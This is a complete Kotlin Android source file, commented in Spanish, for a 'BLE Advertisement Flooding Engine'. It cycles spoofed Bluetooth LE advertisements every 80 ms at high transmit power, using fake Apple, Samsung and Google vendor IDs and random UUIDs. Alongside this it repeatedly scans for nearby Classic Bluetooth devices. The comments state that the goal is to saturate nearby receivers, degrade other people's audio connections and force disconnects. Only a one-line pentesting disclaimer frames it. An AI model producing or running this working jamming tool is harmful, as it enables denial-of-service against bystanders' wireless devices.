package com.industrialble.jamming

import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.ParcelUuid
import android.util.Log
import java.util.Random
import java.util.UUID
import java.util.concurrent.CopyOnWriteArrayList
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.ThreadFactory
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicLong

/**
 * 🔥 BLE Advertisement Flooding Engine
 *
 * ESTRATEGIA:
 * En lugar de saturar solo el chip local (viejo enfoque),
 * este motor INUNDA los 3 canales de advertising BLE (37, 38, 39)
 * con cientos de anuncios falsos por segundo rotando:
 *   - UUIDs de servicio aleatorios
 *   - Datos de fabricante variables
 *   - Service data variable
 *
 * EFECTO en dispositivos BLE cercanos (como un parlante conectado
 * a OTRO teléfono):
 *   - El stack BLE receptor se satura procesando anuncios "nuevos"
 *   - Las conexiones A2DP/Bluetooth Classic existentes se degradan
 *     porque el chip comparte la antena 2.4GHz
 *   - El descubrimiento se vuelve lento o imposible
 *   - Puede provocar desconexiones en dispositivos con stacks BLE
 *     poco robustos
 *
 * ⚠️ Solo para pentesting en dispositivos propios / autorizados.
 */
class JammingEngine(
    private val bluetoothAdapter: BluetoothAdapter,
    private val context: android.content.Context?
) {

    private val advertiser: BluetoothLeAdvertiser? = bluetoothAdapter.bluetoothLeAdvertiser
    private val scheduler: ScheduledExecutorService = Executors.newScheduledThreadPool(
        4,
        ThreadFactory { Thread(it, "ble-flood-${threadCounter.incrementAndGet()}") }
    )

    private val isActive = AtomicBoolean(false)
    private val adsSent = AtomicLong(0)
    private val startTime = AtomicLong(0)
    private val random = Random()

    // Pool de payloads pre-generados
    private val payloads = mutableListOf<AdvertiseData>()
    private var currentPayloadIndex = 0
    private var currentCallback: AdvertiseCallback? = null
    private var failedStartCount = 0

    // Discovered devices (via Classic BT)
    private val _discoveredDevices = CopyOnWriteArrayList<String>()
    val discoveredDevices: List<String> get() = _discoveredDevices.toList()

    // Callbacks
    var onDeviceDiscovered: ((String, String?) -> Unit)? = null
    var onStateChanged: ((Boolean) -> Unit)? = null
    var onLog: ((String) -> Unit)? = null

    data class JamStats(
        val isActive: Boolean,
        val advertisementsSent: Long,
        val elapsedSeconds: Long,
        val devicesFound: Int,
        val payloadsCount: Int
    )

    // ════════════════════════════════════════════════════════════
    // CONTROL
    // ════════════════════════════════════════════════════════════

    fun start() {
        if (isActive.getAndSet(true)) return
        adsSent.set(0)
        failedStartCount = 0
        startTime.set(System.currentTimeMillis())

        log("")
        log("╔══════════════════════════════════════════╗")
        log("║   🔥 BLE ADVERTISEMENT FLOODING INICIADO  ║")
        log("╚══════════════════════════════════════════╝")
        log("📡 Inundando canales BLE 37, 38, 39...")
        log("📱 Tu teléfono: ${bluetoothAdapter.name ?: "Desconocido"}")

        // Verificar si el advertiser está disponible
        if (advertiser == null) {
            log("⚠️ BluetoothLeAdvertiser NO disponible en este dispositivo")
            log("ℹ️  Posibles causas: BT apagado, chip no soporta BLE advertising")
        }

        // Pre-generar pool de payloads aleatorios
        generatePayloadPool(25)
        log("🧬 ${payloads.size} anuncios BLE únicos precargados")

        // Iniciar ciclo de flooding
        currentPayloadIndex = 0
        startFloodingLoop()

        // También lanzar Classic discovery periódico para detectar dispositivos
        startClassicDiscoveryLoop()

        onStateChanged?.invoke(true)
    }

    fun stop() {
        if (!isActive.getAndSet(false)) return
        log("🛑 DETENIENDO BLE FLOODING")

        scheduler.shutdownNow()
        try { scheduler.awaitTermination(2, TimeUnit.SECONDS) } catch (_: InterruptedException) { }

        stopCurrentAdvertising()
        cancelClassicDiscovery()
        unregisterDiscoveryReceiver()

        val elapsed = (System.currentTimeMillis() - startTime.get()) / 1000
        val sent = adsSent.get()
        log("✅ Flooding detenido después de ${elapsed}s")
        log("📊 Anuncios enviados: $sent")
        if (failedStartCount > 0) {
            log("⚠️ Fallos al iniciar advertising: $failedStartCount")
        }
        log("📱 Dispositivos descubiertos: ${_discoveredDevices.size}")

        onStateChanged?.invoke(false)
    }

    fun getStats(): JamStats = JamStats(
        isActive = isActive.get(),
        advertisementsSent = adsSent.get(),
        elapsedSeconds = if (isActive.get())
            (System.currentTimeMillis() - startTime.get()) / 1000
        else 0L,
        devicesFound = _discoveredDevices.size,
        payloadsCount = payloads.size
    )

    fun clearDevices() {
        _discoveredDevices.clear()
    }

    fun shutdown() {
        stop()
    }

    // ════════════════════════════════════════════════════════════
    // BLE ADVERTISING FLOOD LOOP
    // ════════════════════════════════════════════════════════════

    /**
     * Programa rotaciones de anuncios BLE cada ~80ms.
     * Cada rotación: detiene el anuncio actual y empieza uno nuevo
     * con otro payload (UUIDs/datos diferentes).
     *
     * Esto fuerza a los receptores BLE cercanos a procesar
     * un flujo constante de anuncios "nuevos", saturando su stack.
     */
    private fun startFloodingLoop() {
        if (!isActive.get()) return

        scheduler.schedule({
            if (!isActive.get()) return@schedule

            try {
                // Detener anuncio anterior
                stopCurrentAdvertising()

                // Seleccionar siguiente payload (round-robin)
                val payload = payloads[currentPayloadIndex]
                currentPayloadIndex = (currentPayloadIndex + 1) % payloads.size

                // Iniciar nuevo anuncio
                startNextAdvertise(payload)

                // Reprogramar
                startFloodingLoop()
            } catch (e: Exception) {
                log("⚠️ Error en flooding loop: ${e.message}")
                if (isActive.get()) startFloodingLoop()
            }
        }, 80, TimeUnit.MILLISECONDS) // ~12.5 rotaciones/segundo
    }

    private fun startNextAdvertise(data: AdvertiseData) {
        if (advertiser == null) return

        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
            .setConnectable(false)
            .setTimeout(0)
            .build()

        val callback = object : AdvertiseCallback() {
            override fun onStartSuccess(settingsInEffect: AdvertiseSettings) {
                adsSent.incrementAndGet()
            }

            override fun onStartFailure(errorCode: Int) {
                when (errorCode) {
                    ADVERTISE_FAILED_ALREADY_STARTED -> {
                        // Esperado cuando rotamos rápido, ignorar
                    }
                    ADVERTISE_FAILED_DATA_TOO_LARGE -> {
                        failedStartCount++
                    }
                    ADVERTISE_FAILED_TOO_MANY_ADVERTISERS -> {
                        failedStartCount++
                    }
                    ADVERTISE_FAILED_INTERNAL_ERROR -> {
                        failedStartCount++
                        log("⚠️ Error interno advertising BLE")
                    }
                    ADVERTISE_FAILED_FEATURE_UNSUPPORTED -> {
                        if (failedStartCount++ < 2) {
                            log("⚠️ Advertising no soportado en este dispositivo")
                        }
                    }
                }
            }
        }

        currentCallback = callback

        try {
            advertiser?.startAdvertising(settings, data, callback)
        } catch (e: SecurityException) {
            // Permiso BLUETOOTH_ADVERTISE no concedido
            if (failedStartCount++ < 2) {
                log("⚠️ Permiso BLUETOOTH_ADVERTISE no concedido")
            }
        } catch (e: IllegalStateException) {
            // Bluetooth apagado
            if (failedStartCount++ < 2) {
                log("⚠️ Bluetooth apagado, no se puede anunciar")
            }
        } catch (e: Exception) {
            if (failedStartCount++ < 2) {
                log("⚠️ Error iniciando advertising: ${e::class.simpleName}")
            }
        }
    }

    private fun stopCurrentAdvertising() {
        try {
            currentCallback?.let { advertiser?.stopAdvertising(it) }
        } catch (_: Exception) { }
        currentCallback = null
    }

    // ════════════════════════════════════════════════════════════
    // PAYLOAD GENERATION
    // ════════════════════════════════════════════════════════════

    /**
     * Pre-genera N payloads BLE falsos con datos aleatorios.
     * Cada payload parece un dispositivo BLE diferente:
     * - UUIDs de servicio aleatorios (simula distintos tipos de dispositivo)
     * - Datos de fabricante variables (simula distintas marcas)
     * - Service data variable
     */
    private fun generatePayloadPool(count: Int) {
        payloads.clear()

        // Payloads "normales" con datos de fabricante variados
        val vendorIds = intArrayOf(
            0x004C, // Apple
            0x0075, // Samsung
            0x00E0, // Google
            0x0059, // Nokia
            0x0006, // Microsoft
            0x00F0, // Xiaomi
            0x00A1  // Realtek
        )

        for (i in 0 until count) {
            val builder = AdvertiseData.Builder()

            // Ocasionalmente incluir nombre del dispositivo (intermitente)
            builder.setIncludeDeviceName(random.nextInt(3) == 0)

            // TX power level intermitente
            builder.setIncludeTxPowerLevel(random.nextBoolean())

            // 1-4 UUIDs de servicio aleatorios (simula distintos tipos)
            val uuidCount = 1 + random.nextInt(4)
            for (j in 0 until uuidCount) {
                val uuid = UUID.randomUUID()
                builder.addServiceUuid(ParcelUuid(uuid))
            }

            // Datos de fabricante con vendor ID aleatorio
            if (random.nextBoolean()) {
                val vendorId = vendorIds[random.nextInt(vendorIds.size)]
                val dataLen = 2 + random.nextInt(24)
                val data = ByteArray(dataLen)
                random.nextBytes(data)
                // No poner 0 en primer byte para no confundir con datos vacíos
                if (data.isNotEmpty()) data[0] = (1 + random.nextInt(254)).toByte()
                builder.addManufacturerData(vendorId, data)
            }

            // Service data aleatorio
            if (random.nextBoolean()) {
                val uuid = UUID.randomUUID()
                val dataLen = 1 + random.nextInt(20)
                val data = ByteArray(dataLen)
                random.nextBytes(data)
                builder.addServiceData(ParcelUuid(uuid), data)
            }

            payloads.add(builder.build())
        }
    }

    // ════════════════════════════════════════════════════════════
    // CLASSIC BT DISCOVERY (paralelo)
    // ════════════════════════════════════════════════════════════

    /**
     * Escaneo Classic periódico para detectar dispositivos BT cercanos.
     * Corre en paralelo al flooding BLE para también cubrir
     * el espectro Classic BT.
     */
    private var isClassicDiscovering = false
    private var discoveryReceiver: BroadcastReceiver? = null

    private fun startClassicDiscoveryLoop() {
        if (!isActive.get()) return

        scheduler.schedule({
            if (!isActive.get()) return@schedule

            try {
                // Registrar receiver si no lo está
                if (discoveryReceiver == null) {
                    registerDiscoveryReceiver()
                }

                if (!bluetoothAdapter.isDiscovering) {
                    bluetoothAdapter.startDiscovery()
                    isClassicDiscovering = true
                }

                // Cancelar después de 1.5s
                scheduler.schedule({
                    if (isActive.get()) {
                        cancelClassicDiscovery()
                        // Reprogramar otro ciclo en 2s
                        startClassicDiscoveryLoop()
                    }
                }, 1500, TimeUnit.MILLISECONDS)
            } catch (e: Exception) {
                if (isActive.get()) startClassicDiscoveryLoop()
            }
        }, 500, TimeUnit.MILLISECONDS)
    }

    private fun cancelClassicDiscovery() {
        try {
            if (bluetoothAdapter.isDiscovering) {
                bluetoothAdapter.cancelDiscovery()
            }
        } catch (_: Exception) { }
        isClassicDiscovering = false
    }

    private fun registerDiscoveryReceiver() {
        discoveryReceiver = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context, intent: Intent) {
                when (intent.action) {
                    BluetoothDevice.ACTION_FOUND -> {
                        val device = intent.getParcelableExtra<BluetoothDevice>(
                            BluetoothDevice.EXTRA_DEVICE
                        ) ?: return
                        if (!_discoveredDevices.contains(device.address)) {
                            _discoveredDevices.add(device.address)
                            onDeviceDiscovered?.invoke(device.address, device.name)
                        }
                    }
                }
            }
        }
        val filter = IntentFilter().apply {
            addAction(BluetoothDevice.ACTION_FOUND)
        }
        try {
            context?.registerReceiver(discoveryReceiver, filter)
        } catch (e: Exception) {
            log("⚠️ Error registrando receiver discovery: ${e.message}")
        }
    }

    private fun unregisterDiscoveryReceiver() {
        try {
            discoveryReceiver?.let { context?.unregisterReceiver(it) }
        } catch (_: Exception) { }
        discoveryReceiver = null
    }

    // ════════════════════════════════════════════════════════════
    // LOGGING
    // ════════════════════════════════════════════════════════════

    private fun log(msg: String) {
        Log.i(TAG, msg)
        onLog?.invoke(msg)
    }

    companion object {
        private const val TAG = "BleFloodEngine"
        private val threadCounter = AtomicLong(0)
    }
}
